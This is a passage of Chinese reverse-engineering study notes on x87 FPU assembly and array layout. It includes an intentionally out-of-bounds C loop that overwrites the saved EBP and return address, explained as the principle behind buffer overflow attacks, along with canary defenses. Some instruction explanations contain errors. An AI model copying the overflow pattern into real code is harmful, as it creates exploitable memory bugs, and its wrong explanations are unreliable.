将栈指针&#96;esp&#96;的值保存在栈帧基指针&#96;ebp&#96;中，建立函数栈帧   fld     QWORD PTR _a$[ebp]                        ; 将ebp偏移_a的值（即变量_a的值）加载到FPU（浮点运算单元）堆栈中; 当前FPU堆栈状态: ST(0) &#x3D; _a   fdiv   QWORD PTR __real@40091eb851eb851f                        ; 将ST(0)中的值除以常量3.14，并将结果存储在ST(0)中; 当前FPU堆栈状态: ST(0) &#x3D; _a &#x2F; 3.14   fld    QWORD PTR _b$[ebp]                        ; 将ebp偏移_b的值（即变量_b的值）加载到FPU堆栈中; 当前FPU堆栈状态: ST(0) &#x3D; _b; ST(1) &#x3D; _a &#x2F; 3.14   fmul   QWORD PTR __real@4010666666666666                        ; 将ST(0)中的值乘以常量4.1，并将结果存储在ST(0)中; 当前FPU堆栈状态: ST(0) &#x3D; _b * 4.1; ST(1) &#x3D; _a &#x2F; 3.14   faddp ST(1), ST(0)                        ; 将ST(0)和ST(1)中的值相加，并将结果存储在ST(1)中，                        ; 然后弹出堆栈顶（即ST(0)），堆栈平衡; 当前FPU堆栈状态: ST(0) &#x3D; (_a &#x2F; 3.14) + (_b * 4.1)   pop   ebp            ; 恢复调用者的基指针，将栈顶的值弹出到&#96;ebp&#96;中   ret   0              ; 从函数返回，传递0个参数给调用者_f  ENDP                ; 结束过程定义<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>汇编解读</p><ul><li><code>FLD</code>指令从栈中读取8个字节，把这个值转换成<code>FPU</code>寄存器所需的80位数据格式，并存入<code>ST(0)</code>寄存器</li><li><code>FDIV</code>指令把<code>ST(0)</code>寄存器的值用作被除数,把参数<code>__real@40091eb851eb851f</code>（即3.14）的值当作除数.因为汇编语法不支持含有小数点的浮点立即数，所以程序使用64位IEEE 754格式的16进制数</li><li>进行<code>FDIV</code>运算之后，<code>ST(0)</code>寄存器将保存商</li><li>此外，<code>FDIVP</code>也是FPU的除法运算指令。FDIVP在进行ST(1)/ST(0)运算时，先把两个寄存器的值POP出来进行运算，再把商推送入(PUSH)FPU的栈（即ST(0)寄存器）。</li><li>下一条<code>FLD</code>指令把<code>b</code>送入<code>FPU</code>的栈中</li><li>此时<code>ST(1)</code>寄存器里是上次除法运算的商，<code>ST(0)</code>寄存器里是变量<code>b</code>的值</li><li>接下来的<code>FMUL</code>指令做乘法运算，它用ST(0)寄存器里的值（即变量<em>b</em>），乘以参数__real @4010666666666666（即4.1），并将运算结果（积）存储到ST(0)寄存器。</li><li>最后一条运算指令FADDP计算栈内顶部两个值的和。它<code>先把运算结果存储在ST(1)寄存器，再POP ST(0)</code>。所以，<mark>运算表达式的运算结果存储在栈顶的ST(0)寄存器里。</mark></li><li>根据有关规范，<mark>函数必须使用ST(0)寄存器存储浮点运算的返回结果</mark>。所以在FADDP指令之后，除了函数尾声的指令之外再无其他指令。</li></ul><hr /><p><code>GCC -O3</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">; 定义过程 f，作为一个近过程public ff proc near; 定义过程的参数arg_0 &#x3D; qword ptr 8      ; 第一个参数的偏移量，相对于&#96;ebp&#96;的8字节位置arg_8 &#x3D; qword ptr 10h    ; 第二个参数的偏移量，相对于&#96;ebp&#96;的16字节位置                push    ebp      ; 把调用者的栈帧基指针&#96;ebp&#96;推入栈中，保留调用者的栈帧                fld     ds:dbl_8048608 ; 加载全局数据段中的常量3.14到FPU（浮点运算单元）堆栈; 当前栈状态: ST(0) &#x3D; 3.14                mov     ebp, esp ; 创建新的栈帧，ebp指向当前栈顶                fdivr   [ebp+arg_0] ; 反除法指令，将ST(0)中的常量3.14除以第一个参数（arg_0）; 当前栈状态: ST(0) &#x3D; 除法结果 (3.14 &#x2F; arg_0)                fld     ds:dbl_8048610 ; 加载全局数据段中的常量4.1到FPU堆栈; 当前栈状态: ST(0) &#x3D; 4.1, ST(1) &#x3D; 除法结果                fmul    [ebp+arg_8] ; 将ST(0)中的4.1乘以第二个参数（arg_8）; 当前栈状态: ST(0) &#x3D; 乘法结果 (4.1 * arg_8), ST(1) &#x3D; 除法结果                pop     ebp      ; 恢复调用者的栈帧，将栈顶的值弹出到ebp中                faddp   st(1), st ; 将ST(0)和ST(1)相加，并将结果存储在ST(1)中，                                  ; 然后弹出堆栈顶（即ST(0)），栈平衡; 当前栈状态: ST(0) &#x3D; 加法结果 ((3.14 &#x2F; arg_0) + (4.1 * arg_8))                ret               ; 从过程返回，返回地址从栈顶弹出f endp           ; 结束过程定义<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>gcc</code>把3.14送入FPU的栈中(ST(0)寄存器),用作<code>arg_0</code>的除数</p></li><li><p><code>FDIVR</code>是<code>Reverse Divide</code>的缩写。<code>FDIVR</code>指令的除数和被除数，对应<code>FDIV</code>指令的被除数和除数，即位置相反，<code>FDIV</code>是<code>ST[0]</code>作为被除数，<code>FDIVR</code>是<code>ST[0]</code>作除数</p><p>其他相同</p></li></ul><h4 id="利用参数传递浮点型"><a class="markdownIt-Anchor" href="#利用参数传递浮点型"></a> 利用参数传递浮点型</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;math.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"32.01 ^ 1.54 = %lf\n"</span><span class="token punctuation">,</span> <span class="token function">pow</span> <span class="token punctuation">(</span><span class="token number">32.01</span><span class="token punctuation">,</span><span class="token number">1.54</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>msvs x86</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">CONST    SEGMENT__real@40400147ae147ae1 DQ 040400147ae147ae1r    ; 32.01  ; 定义常量32.01，存储在段&#96;CONST&#96;中__real@3ff8a3d70a3d70a4 DQ 03ff8a3d70a3d70a4r    ; 1.54   ; 定义常量1.54，存储在段&#96;CONST&#96;中CONST    ENDS_main    PROC                          ; 主过程 _main 的开始    push   ebp                         ; 将调用者的栈帧基指针&#96;ebp&#96;推入栈，保留调用者的栈帧    mov    ebp, esp                    ; 将当前栈顶指针&#96;esp&#96;的值赋给&#96;ebp&#96;，建立新的栈帧    sub    esp, 8                      ; 为第1个变量分配8个字节的栈空间    fld    QWORD PTR __real@3ff8a3d70a3d70a4   ; 加载常量1.54到FPU（浮点运算单元）堆栈    fstp   QWORD PTR [esp]             ; 将FPU堆栈顶部（ST(0)）的值存储到栈顶（对应第1个变量的空间）    sub    esp, 8                      ; 为第2个变量分配8个字节的栈空间    fld    QWORD PTR __real@40400147ae147ae1   ; 加载常量32.01到FPU堆栈    fstp   QWORD PTR [esp]             ; 将FPU堆栈顶部的值存储到栈顶（对应第2个变量的空间）    call   _pow                        ; 调用&#96;_pow&#96;函数计算幂（默认底数在 [esp + 8]，指数在 [esp]）    add    esp, 8                      ; 调整栈指针，释放第2个变量的空间                                       ; 栈分配了8个字节的空间用于存储函数 &#96;_pow&#96; 的结果; 运算结果存储于FPU堆栈的ST(0)寄存器    fstp   QWORD PTR [esp]             ; 将FPU堆栈顶部的值（&#96;_pow&#96;结果）存储到栈顶，供&#96;printf()&#96;使用    push   OFFSET $SG2651              ; 推送格式字符串的地址到栈，用于&#96;printf()&#96;调用    call   _printf                     ; 调用&#96;printf()&#96;函数打印结果    add    esp, 12                     ; 调整栈指针，释放用于&#96;printf&#96;调用的栈空间（8字节结果 + 4字节地址）    xor    eax, eax                    ; 将&#96;eax&#96;寄存器置零，表示程序返回值为0    pop    ebp                         ; 恢复调用者的栈帧，将栈顶的值弹出到&#96;ebp&#96;中    ret    0                           ; 从过程返回，传递0个参数给调用者_main    ENDP                          ; 结束过程定义<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>汇编解读</p><ul><li>FLD和FSTP指令是在数据段（SEGMENT）和FPU的栈间交换数据的指令。<mark>FLD把内存里的数据推送入FPU的栈</mark>，而<mark>FSTP则把FPU栈顶的数据<code>复制</code>到内存中</mark>。这两个连用相当于使浮点数给入栈了,给pow传递参数</li><li>pow()函数是指数运算函数，它从<mark>FPU的栈内读取两个参数进行计算，并把运算结果（<em>x</em>的<em>y</em>次幂）存储在ST(0)寄存器里</mark>。之后，printf()函数先从内存栈中读取8个字节的数据，再以双精度浮点的形式进行输出。</li><li>此外，这个例子里还可以<mark>直接成对使用MOV指令把浮点数据从内存复制到FPU的栈里。内存本身就把浮点数据存储为IEEE 754的数据格式，而pow()函数所需的参数就是这个格式的数据，所以此处没有格式转换的必要</mark>。</li></ul><h4 id="比较说明"><a class="markdownIt-Anchor" href="#比较说明"></a> 比较说明</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">double</span> <span class="token function">d_max</span> <span class="token punctuation">(</span><span class="token keyword">double</span> a<span class="token punctuation">,</span> <span class="token keyword">double</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token operator">></span>b<span class="token punctuation">)</span>                <span class="token keyword">return</span> a<span class="token punctuation">;</span>        <span class="token keyword">return</span> b<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"%f\n"</span><span class="token punctuation">,</span> <span class="token function">d_max</span> <span class="token punctuation">(</span><span class="token number">1.2</span><span class="token punctuation">,</span> <span class="token number">3.4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"%f\n"</span><span class="token punctuation">,</span> <span class="token function">d_max</span> <span class="token punctuation">(</span><span class="token number">5.6</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr /><p><code>Non-Optimizing MSVS</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">PUBLIC    _d_max_TEXT    SEGMENT_a$ &#x3D; 8              ; 变量_a$在栈帧中的偏移，大小为8字节_b$ &#x3D; 16             ; 变量_b$在栈帧中的偏移，大小为8字节_d_max     PROC    push   ebp               ; 保存旧的基址指针    mov    ebp, esp          ; 将当前栈顶指针赋值给基址指针    fld    QWORD PTR _b$[ebp]; 加载_b$，将其压入FPU堆栈的ST(0)寄存器    ; 当前堆栈状态：ST(0) &#x3D; _b    ; 比较_b（ST(0)）和_a$，然后弹出寄存器    fcomp  QWORD PTR _a$[ebp]; 比较ST(0)和_a$，并弹出ST(0)    ; 此时FPU堆栈为空    fnstsw ax                ; 将FPU状态字存储到AX寄存器    test   ah, 5             ; 检查AX寄存器的高8位的第0和第2位(对应的是C2,C0标志位)    jp     SHORT $LN1@d_max  ; 如果标志位有正数标志(a&lt;&#x3D;b)，则跳转到$LN1@d_max    ; 如果_a &gt; _b，继续执行以下代码    fld    QWORD PTR _a$[ebp]; 加载_a$，将其压入FPU堆栈的ST(0)    jmp    SHORT $LN2@d_max  ; 跳转到$LN2@d_max$LN1@d_max:    fld    QWORD PTR _b$[ebp]; 加载_b$，将其压入FPU堆栈的ST(0)$LN2@d_max:    pop    ebp               ; 恢复基址指针    ret    0                 ; 返回_d_max    ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>FCOMP</code>首先比较<code>ST(0)</code>与<code>_a</code>的值，然后根据比较的结果设置<code>FPU</code>状态字(寄存器)的C3/C2/C0位。<mark><code>FPU</code>的状态字寄存器是一个16位寄存器，用于描述<code>FPU</code>的当前状态</mark></p><ul><li>如果<em>b</em>&gt;a，则C3、C2、C0寄存器的值会分别是0、0、0。</li><li>如果<em>a</em>&gt;<em>b</em>，则寄存器的值会分别是0、0、1。</li><li>如果<em>a</em>=<em>b</em>，则寄存器的值会分别是1、0、0。</li><li>如果出现了错误（NaN或数据不兼容），则寄存器的值是1、1、1。</li></ul><p>在设置好相应比特位之后，<code>FCOMP指令还会从栈里抛出（POP）一个值</code>。FCOM与FCOMP的功能十分相似。<code>FCOM指令只根据数值比较的结果设置状态字，而不会再操作FPU的栈</code>。</p></li><li><p><code>FNSTSW</code> 指令在 x86 汇编中用于将浮点状态字（<code>Floating Point Status Word</code>）存储到指定位置或 AX 寄存器中</p><p><code>F</code>:操作前不等待FPU可用</p><p><code>NST</code>:No STore到内存操作</p><p><code>SW</code>:Status Word(状态字)</p><p>C3/C2/C0标志位对应AX的第14/10/8位。<code>复制数值并不会改变标志位（bit）的数权（位置）</code>。标志位会集中在AX寄存器的高地址位区域——即AH寄存器里。</p><p>以AH来看:0:C0   1:C1   2:C2   6:C3</p><p><code>test ah, 5</code>指令把ah的值（FPU标志位的加权求和值）和0101（二进制的5）做与（AND）运算，并设置标志位。影响test结果的只有第0比特位的C0标志位和第2比特位的C2标志位，因为其他的位都会被置零。</p></li><li><p>奇偶校验位PF（parity flag）的介绍</p><p><mark>PF标志位的作用是判定运算结果中的“1”的个数，如果“1”的个数为偶数，则PF的值为1，否则其值为0。</mark></p><p>检验奇偶位通常用于判断处理过程是否出现故障，并<mark>不能判断这个数值是奇数还是偶数</mark>。FPU有四个条件标志位（C0到C3）。但是，必须把标志位的值组织起来、存放在标志位寄存器中，才能进行奇偶校验位的正确性验证。FPU标志位的用途各有不同：<mark>C0位是进位标志位CF，C2是奇偶校验位PF，C3是零标志位ZF</mark></p><p>在使用FUCOM指令（FPU比较指令的通称）时，<mark>如果操作数里出现了不可比较的浮点值（非数值型内容NaN或其他无法被指令支持的格式），则C2会被设为1。</mark></p><p><mark>如果C0和C2都是0或都是1，则设PF标志为1并触发JP跳转（Jump on Parity</mark>）。前面对C3/C2/C0的取值进行了分类讨论，<mark>C2和C0的数值相同的情况分为<em>b</em>&gt;<em>a</em>和 <em>a</em>=<em>b</em>这两种情况。因为test指令把ah的值与5进行“与”运算，所以C3的值无关紧要</mark>。</p><p>在此之后的指令就很简单了。如果触发了JP跳转，则FLD指令把变量_b的值复制到ST(0)寄存器，否则变量_a的值将会传递给ST（0）寄存器。</p><p>如果需要检测C2的状态</p><p>如果TEST指令遇到错误（NaN等情形），则C2标志位的值会被设置为1。不过我们的程序不检测这类错误。<code>如果编程人员需要处理FPU的错误，他就不得不添加额外的错误检查指令</code>。</p></li></ul><hr /><p><code>Optimizing MSVS 2010</code></p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_a$ &#x3D; 8                  ; size &#x3D; 8_b$ &#x3D; 16                 ; size &#x3D; 8_d_max     PROC    fld     QWORD PTR _b$[esp-4]    fld     QWORD PTR _a$[esp-4]; current stack state: ST(0) &#x3D; _a, ST(1) &#x3D; _b    fcom    ST(1) ; compare _a and ST(1) &#x3D; (_b)    fnstsw  ax    test    ah, 65 ; 00000041H    jne     SHORT $LN5@d_max; copy ST(0) to ST(1) and pop register,; leave (_a) on top    fstp    ST(1); current stack state: ST(0) &#x3D; _a    ret     0$LN5@d_max:; copy ST(0) to ST(0) and pop register,; leave (_b) on top    fstp    ST(0); current stack state: ST(0) &#x3D; _b    ret 0_d_max ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>FCOM指令和前面用过的FCOMP指令略有不同，它不操作FPU栈。而且本例的操作数也和前文有区别，这里它是逆序的。所以，FCOM生成的条件标志位的涵义也与前例不同。</p><ul><li>如果<em>a</em>&gt;<em>b</em>，则C3、C2、C0位的值分别为0、0、0。</li><li>如果<em>b</em>&gt;<em>a</em>，则对应数值为0、0、1。</li><li>如果<em>a</em>=<em>b</em>，则对应数值为1、0、0。</li></ul></li><li><p>是说，“test ah, 65”这条指令仅仅比较两个标志位——C3（第6位/bit）和C0（第0位/bit）。在<em>a</em>&gt;<em>b</em>的情况下，两者都应为0：这种情况下，程序不会被触发JNE跳转，并会执行后面的FSTP ST(1)指令，把ST（0）的值复制到操作数中，然后从FPU栈里抛出一个值。换句话说，这条指令把ST（0）的值（即变量_a的值）复制到ST（1）寄存器；此后栈顶的2个值都是_a。然后，相当于POP出一个值来，使ST(0)寄存器的值为_a，函数随即结束。</p><p>在<em>b</em>&gt;<em>a</em>或<em>a</em>==<em>b</em>的情况下，程序将触发条件转移指令JNE。从ST(0)取值、再赋值给ST(0)寄存器，相当于NOP操作没有实际意义。接着它从栈里POP出一个值，使ST(0)的值为先前ST(1)的值，也就是变量_b。然后结束本函数。大概是因为FPU的指令集里没有POP并舍弃栈顶值的指令，所以才会出现这样的汇报指令。</p></li></ul><h2 id="chap18-数组"><a class="markdownIt-Anchor" href="#chap18-数组"></a> Chap18 数组</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">20</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"a[%d]=%d\n"</span><span class="token punctuation">,</span> i<span class="token punctuation">,</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用msvs 2008 进行编译</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">_TEXT     SEGMENT_i$ &#x3D; -84              ; size &#x3D; 4_a$ &#x3D; -80              ; size &#x3D; 80_main      PROC    push   ebp    mov    ebp, esp    sub    esp, 84    ; 00000054H    mov    DWORD PTR _i$[ebp], 0;i&#x3D;0    jmp    SHORT $LN6@main$LN5@main:;i+&#x3D;1     mov    eax, DWORD PTR _i$[ebp]    add    eax,  1    mov    DWORD PTR _i$[ebp], eax$LN6@main:    cmp    DWORD PTR _i$[ebp], 20; 00000014H    jge    SHORT $LN4@main    mov    ecx, DWORD PTR _i$[ebp];i&lt;20    shl    ecx, 1;ecx*2&#x3D;2i    mov    edx, DWORD PTR _i$[ebp]    mov    DWORD PTR _a$[ebp+edx*4], ecx;a[i]&#x3D;2i    jmp    SHORT $LN5@main$LN4@main:;i&#x3D;0    mov    DWORD PTR _i$[ebp], 0    jmp    SHORT $LN3@main$LN2@main:    mov    eax, DWORD PTR _i$[ebp]    add    eax, 1    mov    DWORD PTR _i$[ebp], eax$LN3@main:;for i in range(20) printf(a[i])    cmp    DWORD PTR _i$[ebp], 20    ; 00000014H    jge    SHORT $LN1@main;ret    mov    ecx, DWORD PTR _i$[ebp]    mov    edx, DWORD PTR _a$[ebp+ecx*4]    push   edx    mov    eax, DWORD PTR _i$[ebp]    push   eax    push   OFFSET $SG2463    call   _printf    add    esp, 12        ; 0000000cH    jmp    SHORT $LN2@main$LN1@main:    xor    eax, eax    mov    esp, ebp    pop    ebp    ret    0_main      ENDP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>程序为数组申请了80字节的栈空间，以存储20个4字节元素。</li><li>因为全部数组都存储于栈中，所以我们可以在内存数据窗口里看到整个数组。</li></ul><hr /><p>gcc</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">                public mainmain            proc near                   ; DATA XREF: _start+17var_70          &#x3D; dword ptr -70hvar_6C          &#x3D; dword ptr -6Chvar_68          &#x3D; dword ptr -68hi_2             &#x3D; dword ptr -54hi               &#x3D; dword ptr -4                push     ebp                mov      ebp, esp                and      esp, 0FFFFFFF0h;对齐                sub      esp, 70h                mov      [esp+70h+i], 0     ; i&#x3D;0                jmp      short loc_804840Aloc_80483F7:                mov      eax, [esp+70h+i]                mov      edx, [esp+70h+i]                add      edx, edx           ; edx&#x3D;i*2                mov      [esp+eax*4+70h+i_2], edx                add      [esp+70h+i], 1     ;  i++loc_804840A:                cmp      [esp+70h+i], 13h;19                jle      short loc_80483F7;i&lt;&#x3D;19                mov      [esp+70h+i], 0;i&#x3D;0                jmp      short loc_8048441loc_804841B:                mov      eax, [esp+70h+i]                mov      edx, [esp+eax*4+70h+i_2]                mov      eax, offset aADD ; &quot;a[%d]&#x3D;%d\n&quot;                mov      [esp+70h+var_68], edx                mov      edx, [esp+70h+i]                mov      [esp+70h+var_6C], edx                mov      [esp+70h+var_70], eax                call     _printf                add      [esp+70h+i], 1loc_8048441:                cmp      [esp+70h+i], 13h                jle      short loc_804841B;i&lt;&#x3D;19                mov      eax, 0                leave                retnmain            endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>实际上变量==<em>a</em>的数据类型是整型指针。严格地说，在把数组传递给函数的时候，传递的数据就是指向第一个元素的指针，我们再根据这个指针就可以轻松地计算出数组每个元素的地址（即指针）。==如果使用a[idx]的形式表示数组元素，其中idx是数组元素在数组里的排列序号（即索引号），那么就可以通过数组第一个元素的地址、索引号和数据容量求得各个元素的地址。</p><p>举个典型的例子：字符串常量“string”是字符型数组，它的每个字符元素都是const char*型数据。使用索引号之后，我们就可以使用“string”[i]的形式描述字符串中的第<em>i</em>个字符——这正是C/C＋＋表达式的表示方法！</p></li></ul><h3 id="缓冲区溢出"><a class="markdownIt-Anchor" href="#缓冲区溢出"></a> 缓冲区溢出</h3><p>从汇编代码可以看出:编译器没有对索引进行判断，</p><p>可以访问a[20]</p><hr /><p>向数组边界之外的地址赋值</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">30</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                 a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序发生了崩溃</p><p>使用onlydbg加载，跟踪程序崩溃原因</p><ul><li><p>当30个循环结束后，<code>EIP</code>的值是0x15，显然不合法，此时<code>EBP</code>为0x14，<code>ECX</code>和<code>EDX</code>值为0x1D</p><p>Why?</p></li><li><p>首先回顾栈的结构</p><p>，main()函数的栈结构如下：</p><table><thead><tr><th>ESP</th><th><em>i</em>所占用的4字节</th></tr></thead><tbody><tr><td>ESP+4</td><td><em>a</em>[20]占用的80字节</td></tr><tr><td>ESP+84</td><td>保存过的EBP</td></tr><tr><td>ESP+88</td><td>返回地址</td></tr></tbody></table><p>赋值给<em>a</em>[19]的时候，数组<em>a</em>[]已经被全部赋值。</p><p>赋值给a[20]实际上修改的是栈里保存的<code>EBP</code>，本例中将20赋值了给a[10],函数退出之前会将ebp设置为这个值，因此ebp为0x14</p><p>最后运行<code>RET</code>指令，相当于<code>POP EIP</code>，<code>RET</code>指令将程序的控制权传递给栈里的返回地址，不过此时这个值为0x15，这里没有可执行代码，因此崩溃</p></li><li><p>事实上，这就是缓冲区溢出攻击的原理，我们可以劫持返回地址来控制eip来跳转到其他程序的地址</p><p>目前已经有了很多手段来防御这种攻击，学pwn的时候再深入了解</p><ul><li><p>canary，随机写入随机数，在函数结束之前检查这些值是否发生变化</p></li><li><p>如果启用MSVC的RTC1和RTCs选项编译本章开头的那段程序，就会在汇编指令里看到函数在退出之前调用@_RTC_CheckStackVars@8，用以检测“百灵鸟”是否会报警。</p></li><li><p>用gcc编译</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov     eax, DWORD PTR [ebp-12]        xor     eax, DWORD PTR gs:20；         jne     .L5        mov     ebx, DWORD PTR [ebp-4].L5:        call    __stack_chk_fail<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显然随机值位于gs：20,</p></li></ul></li><li><p>gs开头的寄存器就是常说的段寄存器。在MS-DOS和基于DOS的系统里，段寄存器的作用很广泛。但是，今天它的作用发生了变化。简单地说，Linux下的gs 寄存器总是指向TLS（参见第65章）——存储线程的多种特定信息。（Win32环境下的fs寄存器起到Linux下gs寄存器的作用。Win32的fs寄存器指向TIB）</p></li></ul><h3 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h3><p>现在我们应该可以理解为什么C/C++编译不了下面的程序了。</p><pre class="line-numbers language-none"><code class="language-none">void f(int size)&#123;    int a[size];...&#125;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><mark>在编译阶段，编译器必须确切地知道需要给数组分配多大的存储空间，它需要事先明确分配局部栈或数据段（全局变量）的格局，所以编译器无法处理上述这种长度可变的数组。</mark></p><p>如果无法事先确定数组的长度，那么我们就应当使用malloc()函数分配出一块内存，然后直接按照常规变量数组的方式访问这块内存；或者遵循C99标准（参见ISO07，6.7.5/2）进行处理，但是遵循C99标准而设计出来的程序，内部实现的方法更接近alloca()函数（详情请参阅5.2.4节）。</p><h3 id="字符串指针"><a class="markdownIt-Anchor" href="#字符串指针"></a> 字符串指针</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token 